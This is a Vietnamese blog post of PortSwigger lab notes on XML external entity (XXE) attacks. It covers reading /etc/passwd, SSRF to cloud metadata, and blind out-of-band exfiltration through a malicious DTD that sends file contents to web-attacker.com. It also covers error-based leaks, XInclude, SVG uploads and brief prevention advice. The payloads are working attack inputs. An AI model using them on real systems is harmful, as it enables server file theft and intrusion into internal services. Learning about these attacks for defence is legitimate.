---
layout: post
title:  "XXE"
date:   2025-07-30 12:00:00 +0700
tags: PortSwigger
categories: jekyll update
---

# XXE - XML external Entity 

Lỗ hổng này cho phép kẻ tấn công can thiệp vào quá trình xử lý dữ liệu XML của ứng dụng. Kẻ tấn công có thể: 
- Xem các tệp trên hệ thống file của máy chủ ứng dụng.
- Tương tác với cả hệ thống phía sau hoặc hệ thống bên ngoài. 

Trong một số trường hợp thì attacker có thể lợi dụng XXE để dẫn tới SSRF. 

## Lỗ hổng XXE xảy ra như thế nào? 

Một số ứng dụng dùng format XML để trao đổi giữa trình duyệt và server. Thường thì các ứng dụng này luôn sử dụng 1 thư viện tiêu chuẩn hoặc API để xử lý dữ liệu XML trên máy chủ. 

Lỗ hổng XXE phát sinh do đặc tả của XML chứa nhiều tính năng có thể gây nguy hiểm, và các trình phân tích cú pháp (parser) tiêu chuẩn thường hỗ trợ những tính năng này. 

## Tìm hiểu sâu về XML

XML là ngôn ngữ dùng để lưu trữ và truyền tải dữ liệu, với cấu trúc dạng cây. Khác với HTML, XML không có các thẻ được định nghĩa sẵn, nên người dùng có thể tự đặt tên thẻ sao cho phù hợp với dữ liệu.

### Thực thể trong XML

Các thực thể XML là cách để biểu diễn một dữ liệu nào đó trong tài liệu XML mà không dùng trực tiếp giá trị thật của dữ liệu. Trong đặc tả của ngôn ngữ XML có định nghĩa sẵn nhiều thực thể. 
Ví dụ: `&lt;` và `&gt;` là các thực thể dùng để biểu diễn các ký tự `<` và `>`

### Document Type Definition là cái gì? 

Định nghĩa kiểu tài liệu XML chứa các khai báo giúp xác định cấu trúc của tài liệu XML, kiểu dữ liệu mà nó có thể chứa, và các thành phần khác.

DTD được khai báo trong phần tử `DOCTYPE` ở đầu tài liệu XML.

DTD được tồn tại dưới ba dạng: 
- Internal DTD: DTD được định nghĩa hoàn toàn bên trong tài liệu XML. 
- External DTD: DTD được tải từ một nguồn bên ngoài (thường là một file riêng). 
- Hybrid DTD: Kết hợp cả định nghĩa bên trong và bên ngoài dữ liệu. 

### Thực thể XML custom là cái gì? 

XML cho phép custom thực thể được định nghĩa với DTD. 

```XML
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
``` 

### Thực thể XML external là cái gì? 

Thực thể XML external là một dạng thực thể custom, nhưng khác biệt ở chỗ phần định nghĩa của chúng nằm bên ngoài DTD nơi chúng được khai báo. 

Để khai báo thực thể external trong XML dùng từ khóa `SYSTEM` và phải chỉ định một URL mà từ đó giá trị của thực thể sẽ được tải về. 

```XML
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
```
```XML
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
``` 

## Các loại tấn công XXE 

### Khai thác XXE để trích xuất file 

Để khai thác cần chỉnh sửa XML được chấp nhận theo hai cách: 
- Thêm mới (hoặc chỉnh sửa) một phần tử `DOCTYPE` để khai báo một thực thể bên ngoài chứa đường dẫn đến file cần truy xuất. 
- Chỉnh sửa một giá trị dữ liệu trong XML mà ứng dụng trả về, để sử dụng thực thể bên ngoài (external entity) đã được khai báo. 

Ví dụ có một mẫu XML như sau: 

```XML
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
``` 

Nếu mình chỉnh sửa lại như sau: 

```XML 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
``` 
Đây là một payload tấn công XXE: 
- Ở đây đã định nghĩa 1 thực thể external `&xxe;` với giá trị là nội dung của file là `/etc/passwd` 
- Sau đó, entity `&xxe;` được sử dụng trong thẻ `<productId>` 

Khi server xử lý XML này và phản hồi lại nội dung của `productId`, nó sẽ: 
- Thay `&xxe;` bằng nội dung thực sự của file `/etc/passwd` 
- Kết quả là attacker nhìn thấy nội dung của file `/etc/passwd` trong phản hồi HTTP. 

### LAB01 

Lab này sử dụng XML trong phần check stock. 

![image](https://hackmd.io/_uploads/BkSvk6SPeg.png)

Nó ko có biện pháp bảo vệ, nên mình chỉnh sửa như sau: 

![image](https://hackmd.io/_uploads/HktggarPex.png)

### Khai thác XXE để thực hiện tấn công SSRF 

Ngoài đánh cắp dữ liệu nhạy cảm, tác động chính của XXE là SSRF. 

Để khai thác một lổng hổng XXE nhằm thực hiện tấn công SSRF, cần: 
- Khai báo một thực thể external trong phần `DOCTYPE`, trong đó chứa URL. 
- Sử dụng thực thể đó trong phần dữ liệu XML, giống cách khai thác đọc file. 
- Nếu giá trị entity được phản hồi lại bởi ứng dụng, sau đó xem phản hồi trong HTTP.
- Nếu không có phản hồi, thì mình vẫn có thể thực hiện blind SSRF. 

```XML 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

### LAB02 

Lab này sử dụng XML trong phần check stock. 

![image](https://hackmd.io/_uploads/r1oPBTrvxg.png)

Để thực hiện tấn công SSRF thì truyền vào như sau: 

![image](https://hackmd.io/_uploads/Hy9-PaSwgl.png)

Thì nó hiển thị `latest` cho nên mình phải thêm phía sau URL thành `http://169.254.169.254/latest`

![image](https://hackmd.io/_uploads/Skl8P6HDlx.png)

Tiếp tục, khai thác như vậy. 

![image](https://hackmd.io/_uploads/rJ1rO6rvgx.png)

### Lỗ hỗng Blind XXE 

Blind XXE là lỗ hổng XXE mà ứng dụng không trả lại nội dung thực thể bên ngoài, nên không thể đọc trực tiếp từ server. 

Có hai cách chính: 
- Out-of-band (OAST): Gửi thực thể trỏ đến server của attacker để xác nhận lỗ hổng và có thể rò rỉ dữ liệu qua URL. 
- Gây lỗi XML parser: Cố tình làm parser lỗi để nhận được thông báo lỗi chứa thông tin nhạy cảm như đường dẫn file hoặc nội dung nội bộ. 

### Detect blind XXE dùng kỹ thuật OAST 

Sử dụng kỹ thuật sau: 

```XML 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
``` 
Bằng cách chèn thực thể đã định nghĩa vào một trường dữ liệu trong XML, attacker có thể buộc server gửi request ngầm đến URL chỉ định. Nếu attacker nhận được DNS/HTTP request từ server, thì chứng tỏ XXE hoạt động thành công, giúp phát hiện lỗ hổng dù không thấy phản hồi dũ liệu rõ ràng. 

### LAB03 

Lab này sử dụng XML trong phần check stock. 

![image](https://hackmd.io/_uploads/B1HVIbUPgg.png)

Nhưng nó sẽ ko thể thực hiện tấn công bằng các payload bình thường, mà nó là blind XXE. 

![image](https://hackmd.io/_uploads/S1LpDWLDee.png)

Từ đây, nó trả về các DNS. 

![image](https://hackmd.io/_uploads/r1S1OWLDle.png)

Nhưng mà lâu lâu thì các thực thể bình thường sẽ bị chặn, trong trường hợp này thì mình dùng **tham số thực thể XML** để thay thế. 

Các tham số thực thể XML chỉ có thể được tham chiếu từ bên trong phần DTD. Để sử dụng điều này, mình cần: 
- Đầu tiên, khai báo một tham số thực thể trong XML bao gồm ký tự phần trăm `%` đặt trước tên của thực thể. 

```XML 
<!ENTITY % myparameterentity "my parameter entity value" >
``` 
- Thứ hai, các tham số thực thể được tham chiếu bằng cách sử dụng ký tự phần trăm `%` thay vì ký tự `&` thông thường. 

```XML 
%myparameterentity;
``` 
Điều này có thể dẫn đến test blind XXE dùng OAST thông qua tham số thực thể XML như sau: 

```XML 
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
``` 

### LAB04 

Lab này sử dụng XML trong phần check stock. 

![image](https://hackmd.io/_uploads/r18fRMPwel.png)

Mình cũng thử test blind XXE bằng tham số thực thể như bình xem như thế nào ? 

![image](https://hackmd.io/_uploads/SkQn1XDweg.png)

Thì mình bị chặn khi dùng các thực thể bên ngoài. Nên mình sẽ dùng tham số thực thể như sau: 

![image](https://hackmd.io/_uploads/S17UxQDvll.png)

Quan sát thì sẽ có các DNS trả về. 

![image](https://hackmd.io/_uploads/B1ZYgXwwxe.png)

### Khai thác Blind XXE để rò rỉ dữ liệu out-of-band 

Để thực hiện thì attacker cần: 
- Lưu trữ một DTD độc hại trên một máy chủ do attacker dựng lên. 
- Và sau đó gọi DTD đó từ xa bằng cách nhúng nó vào một payload XXE được gửi đến hệ thống mục tiêu. 

```XML 
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Cái DTD ở trên được giải thích như sau: 
- Định nghĩa 1 tham số thực thể XML là `file`, đường dẫn tới `/etc/passwd`. 
- Định nghĩa 1 tham số thực thể XML là `eval`, dùng để khai báo một tham số thực thể XML khác tên là `exfiltrate`. Thực thể `exfiltrate` này sẽ thực hiện 1 HTTP request tới web server của attacker có tham số `x` mang giá trị là nội dung của thực thể`file`. 
- Gọi `%eval;` để kích hoạt khai báo tham số thực thể `exfiltrate` bên trong nó. 
- Gọi `%exfiltrate;` để ép máy chủ thực hiện request ra ngoài, qua đó gây rò rỉ nội dung file `/etc/passwd`. 

Attacker phải host một file DTD độc hại, như sau: 
```URL 
http://web-attacker.com/malicious.dtd
``` 

Cuối cùng, attacker phải submit XXE payload trên mục tiêu như sau: 
```XML 
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
``` 
### LAB05 

Lab này cũng sử dụng XML trong phần check stock. 

![image](https://hackmd.io/_uploads/Syu5UQwPgg.png)

Mình sẽ thực hiện blind XXE qua out-of-band để lấy dữ liệu như sau: 

- Đầu tiên, mình sẽ viết 1 file DTD độc hại trên 1 server đã dựng sẵn như sau: 

![image](https://hackmd.io/_uploads/HJGcKQPDll.png)

Thì khi đó, file DTD sẽ được lưu như sau: 

![image](https://hackmd.io/_uploads/rkiOYmDwgx.png)

- Thứ hai, mình sẽ gọi tới link chứa file DTD trên mục tiêu như sau: 

![image](https://hackmd.io/_uploads/HJ-sYmDvxl.png)

Sau đó, mình xem log trả về trên web server như sau: 

![image](https://hackmd.io/_uploads/SkqTtXwvgx.png)

### Khai thác blind XXE để trích xuất data thông qua thông báo lỗi 

Mục đích là mình sẽ cố tình làm lỗi phân tích cú pháp XML, từ đó nó thông báo lỗi thì trả về trích xuất dữ liệu. 

Mình có thể viết 1 file DTD như sau: 

```XML 
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
File DTD được giải thích như sau: 
- Định nghĩa tham số thực thể là `file`, dẫn tới file `/etc/passwd`
- Định nghĩa tham số thực thể là `eval`, để khai báo 1 tham số thực thể khác là `error` dẫn tới 1 file ko tồn tại từ đây gây lỗi. 
- Gọi tới `%eval;` để kích hoạt khai báo tham số thực thể bên trong nó là `error`
- Gọi tới `%error;` để ép máy chủ đi tới 1 file ko tồn tại từ đó sinh lỗi. 

### LAB06 

Lab này cũng sử dụng XML trong check stock. 

![image](https://hackmd.io/_uploads/rJZe1NvPll.png)

Đầu tiên, mình cũng host 1 file DTD trên server. 

![image](https://hackmd.io/_uploads/HJbZbNDvxl.png)

Tiếp theo mình cũng chèn 1 tham số thực thể để gọi tới DTD trên server attacker. 

![image](https://hackmd.io/_uploads/By5uWEvvxl.png)

### Khai thác Blind XXE bằng cách tái sử dụng DTD local trên hệ thống 

Nếu ứng dụng không cho phép kết nối out-of-band: 
- Không thể gửi dữ liệu ra ngoài qua HTTP/DNS
- Không thể tải external DTD từ máy chủ attacker
=> ko thể khai thác 

Tuy nhiên vẫn còn cách là: 
Nếu tài liệu XML sử dụng DTD kết hợp giữa internal và external, thì: 
- Internal DTD có thể bị ghi đè các thực thể đã được khai báo trong external DTD 
- Khi đó, ràng buộc cấm lồng thực thể tham số trong internal DTD được nới lỏng. 

Về bản chất, cuộc tấn công này lợi dụng một file DTD đã tồn tại trên máy chủ, và tái sử dụng nó bằng cách ghi đè một thực thể sẵn có, theo cách gây ra lỗi khi phân tích cú pháp XML - lỗi này có thể chứa dữ liệu nhạy cảm. 

Ví dụ có file DTD trên server nằm tại `/usr/local/app/schema.dtd`, và trong file DTD định nghĩa 1 thực thể được gọi là `custom_entity`. Một attacker có thể trigger phân tích cú pháp gây lỗi XML với nội dung của file `/etc/passwd` bằng cách dùng hybrid DTD như sau: 

```XML 
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
``` 

File DTD ở trên được giải thích như sau: 
- Đầu tiên sẽ có 1 tham số thực thể là `load_dtd` để load 1 file XML nội bộ. Và trong đó có 1 thực thể có sẵn là `custom_entity`. 
- Dùng lại thực thể `custom_entity` để ghi đè. Khai báo 1 tham số thực thể là `file` dẫn đến `/etc/passwd`. 
- Cũng dùng `custom_entity` để tiếp khai báo thêm tham số thực thể là `eval`. Tham số thực thể `eval` sẽ định nghĩa tham số thực thể `error`. Dẫn tới file ko tồn tại từ đó gây ra lỗi.

Ở đây `&#x26;#x25;` là để bypass khi phân tích XML nó sẽ thành dấu `%`. Khi decode nó sẽ là `&#x26;#x25;` => `&#x25;` => `%`, từ đây ko gây lỗi phân tích cú pháp XML mà định nghĩa đúng tham số thực thể `error`. 

#### Xác định 1 file DTD tồn tại để tái sử dụng. 

Điều kiện quyết định để kỹ thuật này thành công là phải xác định được file phù hợp. Điều này mình có thể làm bằng cách tải file DTD local chỉ bằng cách thử tải chúng từ bên trong DTD local. 

Ví dụ 1 hệ thống chạy trên Linux và sử dụng desktop GNOME thường có 1 file DTD nằm tại `/usr/share/yelp/dtd/docbookx.dtd` 

Mình có thể kiểm tra xem file này có tồn tại hay ko bằng cách gửi 1 payload XXE như sau: 

```XML 
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

### LAB07 

Ở lab này cũng dùng XML trong phần check stock. Và nó sử dụng môi trường desktop GNOME nên tại DTD mặc định là `/usr/share/yelp/dtd/dockbookx.dtd` và có 1 thực thể là `ISOamso`

Đầu tiên, mình cần xác định là có file DTD local như đường dẫn trên ko. 

![image](https://hackmd.io/_uploads/By0NALvDgl.png)

Nó ko trả về lỗi thì có nghĩa là file hoàn toàn tồn tại. 

Sau đó mình tiến hành ghi đè qua thực thể đã cho biết trước. 

![image](https://hackmd.io/_uploads/H14vbDDwxe.png)

## Tìm bề mặt tấn công XXE

### Tấn công XInclude 

Một số ứng dụng nhận dữ liệu từ người dùng, sau đó nhúng vào một tài liệu XML trên phía server, rồi sau đó phân tích tài liệu XML này. Thường thấy là khi dữ liệu từ client được chèn vào trong một request SOAP ở backend, sau đó được xử lý bởi dịch vụ SOAP ở phía máy chủ. 

Nghĩa là mình ko thể kiểm soát hoàn toàn XML để mình dùng `<!DOCTYPE>` nhưng vẫn có thể dùng `XInclude` chèn file hệ thống, miễn là backend có hỗ trợ phân tích XML và hỗ trợ XInclude. 

```XML 
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
``` 

### LAB08

Ở lab này cũng dùng XML trong phần check stock, nhưng nó ko hiển thị. Và mình ko thể kiểm soát hoàn toàn XML nên mình XInclude như sau: 

![image](https://hackmd.io/_uploads/r13T8vvvlx.png)

Sau đó, mình truyền như sau: 

![image](https://hackmd.io/_uploads/SyASDPDDee.png)

### Khai thác XXE thông qua File Upload

Một số server lại cho phép upload các file XML hoặc là XML subcomponents. 

- File SVG = file ảnh nhưng là XML -> XXE 
- App tưởng người dùng chỉ upload JPEG/PNG -> lỡ thư viện xử lý SVG -> XXE. 

### LAB09 

Ở lab này có 1 chức năng upload hình ảnh. Nhưng hình ảnh mà có hỗ trợ XML là file SVG. 

![image](https://hackmd.io/_uploads/S1447Dvvex.png)

Vì vậy mình tạo 1 file SVG sẽ đó upload lên thì có nội dung như sau: 

![image](https://hackmd.io/_uploads/HypFEDDvlx.png)

Sau khi upload xong, mình truy cập vào trong đường dẫn lưu hình ảnh. 

![image](https://hackmd.io/_uploads/Bkrq4vvPxx.png)

### Khai thác XXE thông qua chỉnh sửa content-type 

Một số ứng dụng content-type được tạo bởi HTML form, như là `application/x-www-form-urlencoded`

Ví dụ: 

```HTTP 
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
``` 

Mình có thể chỉnh sửa lại thành mà server vẫn chấp nhận.

```HTTP 
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
``` 

### Ngăn chặn XXE 

Hầu hết các lỗ hổng XXE đều phát sinh do thư viện phân tích cú pháp XML của ứng dụng hỗ trợ các tính năng XML nguy hiểm mà ứng dụng không cần đến hoặc không có ý định sử dụng.

Cách đơn giản và hiệu quả nhất để ngăn chặn các cuộc tấn công XXE là vô hiệu hóa các tính năng này.

Thông thường, chỉ cần vô hiệu hóa việc phân giải các thực thể bên ngoài (external entities) và vô hiệu hóa hỗ trợ cho XInclude là đủ. Việc này thường có thể thực hiện thông qua tùy chọn cấu hình hoặc ghi đè hành vi mặc định bằng lập trình.

